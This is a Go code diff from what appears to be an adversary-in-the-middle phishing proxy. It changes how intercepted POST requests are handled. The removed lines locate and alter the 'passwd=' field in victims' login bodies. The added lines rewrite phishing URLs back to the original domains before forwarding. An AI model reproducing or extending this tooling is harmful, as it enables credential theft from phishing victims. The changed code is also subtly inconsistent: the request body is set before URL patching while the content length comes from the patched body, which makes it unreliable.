@@ -660,33 +660,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					//req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
-						bodyStr := string(body)
-						startIndex := strings.Index(bodyStr, "passwd=")
-						if startIndex == -1 {
-							// fmt.Println("String 'passwd=' not found in body")
-							body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
-							req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
-						} else {
-							endIndex := strings.Index(bodyStr[startIndex:], "&")
-							if endIndex == -1 {
-								endIndex = len(bodyStr)
-							} else {
-								endIndex += startIndex
-							}
-							substring := bodyStr[startIndex+len("passwd=") : endIndex]
+						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 
-							// log.Success("Substring = %s", substring)
-
-							modifiedString := substring[:1] + substring[2:]
-
-							modifiedBody := strings.Replace(bodyStr, substring, modifiedString, 1)
-							// log.Success("Modified = %s", modifiedBody)
-
-							byteArray := []byte(modifiedBody)
-
-							body = p.patchUrls(pl, byteArray, CONVERT_TO_ORIGINAL_URLS)
-							req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
-						}
+						// patch phishing URLs in JSON body with original domains
+						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
+						
 						req.ContentLength = int64(len(body))
 
 						log.Debug("POST: %s", req.URL.Path)
